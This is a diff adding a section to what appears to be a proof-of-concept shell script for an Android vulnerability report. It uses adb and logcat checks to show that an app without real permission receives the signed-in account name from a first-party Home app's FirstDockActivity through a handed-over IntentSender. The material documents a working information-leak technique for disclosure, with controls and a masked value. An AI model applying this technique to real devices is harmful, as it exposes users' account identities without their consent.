@@ -200,3 +200,66 @@ even a caught SecurityException. The refusal is recorded by the framework
 without reaching the caller. I did not chase down why: the comparison rests
 on the framework's line, not on what either app chooses to log.
 NOTE
+
+# ======================================================================
+# What reaching that activity is worth.
+#
+# FirstDockActivity.C() takes an IntentSender out of the intent that
+# started it, merges an "accountName" extra holding the signed-in account
+# into a com.android.wizard.NEXT intent, and fires it. So each build hands
+# over an IntentSender of its own and we see what comes back.
+#
+# Both deliveries land in SinkReceiver, which is not exported, so each one
+# can only have come through that app's own PendingIntent.
+# ======================================================================
+echo
+echo "== what the caller receives back =="
+adb logcat -c </dev/null >/dev/null 2>&1
+
+echo "[1/2] control handing over its IntentSender"
+fire "$CTL" dock
+echo "[2/2] PoC handing over its IntentSender"
+fire "$PROBE" dock
+sleep 2
+
+adb logcat -d MVRP:I ActivityTaskManager:W '*:S' </dev/null 2>/dev/null \
+  | tr -d '\r' > "$ALOG"
+
+dock_ok=0
+# ---- control 5: both builds really tried ----
+for p in "$CTL" "$PROBE"; do
+  if [ "$(grep -c "DOCK from $p" "$ALOG")" -eq 0 ]; then
+    echo "!! BROKEN: no DOCK line from $p — it did not run, or logcat missed it."
+    dock_ok=1
+  fi
+done
+# ---- control 6: the PoC got a delivery and the control did not ----
+if [ "$(grep -c "SINK in $PROBE" "$ALOG")" -eq 0 ]; then
+  echo "!! BROKEN: the PoC received nothing. Nothing to claim here."
+  dock_ok=1
+fi
+if [ "$(grep -c "SINK in $CTL" "$ALOG")" -ne 0 ]; then
+  echo "!! BROKEN: the control received a delivery too, so the permission is"
+  echo "!!         not what decides this. Do not report it as if it were."
+  dock_ok=1
+fi
+if [ "$dock_ok" -ne 0 ]; then
+  echo "!! Do not screenshot this section."
+  exit 2
+fi
+
+grep -E 'DOCK from|SINK in|accountName|Permission Denial|  [a-zA-Z_]+ = ' "$ALOG" \
+  | sed 's/^/   /'
+
+cat <<'NOTE'
+
+== how to read it ==
+The control is refused at startActivity and its SinkReceiver gets nothing.
+The PoC's SinkReceiver gets a com.android.wizard.NEXT delivery holding
+accountName, the account signed into the Home app. The value is masked by
+the PoC on purpose: showing that the key arrives with a real value attached
+does not require printing the address.
+
+That is the actual gain: not that a component is reachable, but that an app
+holding no real permission is handed the user's account by a first-party app.
+NOTE
